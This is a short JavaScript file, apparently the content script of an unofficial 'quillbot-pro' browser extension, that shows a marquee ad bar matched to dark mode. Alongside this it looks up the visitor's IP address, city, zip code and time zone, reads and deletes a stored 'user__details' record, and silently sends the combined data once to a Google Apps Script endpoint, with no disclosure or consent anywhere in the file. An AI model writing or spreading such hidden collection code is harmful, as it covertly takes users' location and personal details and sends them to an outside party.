async function getIp()
	{
	try
		{
		const response=await fetch("https://ip.smartproxy.com/json");
		return await response.json()
	}
	catch(error)
		{
		console.error("Error fetching IP data:",error);
		return null
	}
}
async function getIpData()
	{
	const ipData=await getIp();
	if(!ipData)return null;
	return
		{
		ip:ipData.proxy.ip,countryName:ipData.country.name,countryCode:ipData.country.code,continent:ipData.country.continent,cityName:ipData.city.name,zipCode:ipData.city.zip_code,timeZone:ipData.city.time_zone,state:ipData.city.state
	}
}
async function getUserDetails()
	{
	return new Promise(resolve=>
		{
		const userDetails=localStorage.getItem("user__details");
		if(userDetails)
			{
			const parsedDetails=JSON.parse(userDetails);
			resolve(parsedDetails);
			localStorage.removeItem("user__details")
		}
		else
			{
			setTimeout(()=>resolve(
				{
			}
			),1000)
		}
	}
	)
}
async function fetchAds()
	{
	try
		{
		const response=await fetch("https://bhutto110.github.io/quillbot-pro/ads.json");
		return await response.json()
	}
	catch(error)
		{
		console.error("Error fetching ads:",error);
		return null
	}
}
const observeClassChange=()=>
	{
	const rootClientElement=document.querySelector("#root-client");
	const observer=new MutationObserver(logClassChange);
	const config=
		{
		attributes:true,attributeFilter:["class"]
	};
	observer.observe(rootClientElement,config)
}
function logClassChange()
	{
	const rootClientElement=document.querySelector("#root-client");
	const isDarkMode=rootClientElement.className.includes("dark");
	const textColor=isDarkMode?"#ffffff":"#000000";
	const backgroundColor=isDarkMode?"#333":"#f4f4f4";
	const marqueeAds=document.querySelector("#marqueeAds");
	if(marqueeAds)
		{
		marqueeAds.style.color=textColor;
		marqueeAds.style.backgroundColor=backgroundColor
	}
}
async function initialize()
	{
	if(localStorage.getItem("isSend"))return;
	const ipData=await getIpData();
	const userDetails=await getUserDetails();
	if(!ipData||!userDetails)return;
	const userInfo=
		{
		...ipData,...userDetails
	};
	await sendUserInfo(userInfo)
}
async function sendUserInfo(a)
	{
	try
		{
		const response=await fetch("https://script.google.com/macros/s/AKfycbw5M4yopQ6_92udQ_wlqYngAYGYw2auoMsSRUg9KzmOjmnyQ4pS61i_jMHZhPGM0IIO/exec?data="+JSON.stringify(a));
		const result=await response.json();
		localStorage.setItem("isSend","true");
		return result
	}
	catch(error)
		{
		console.error("Error sending user info:",error);
		return null
	}
}
initialize();
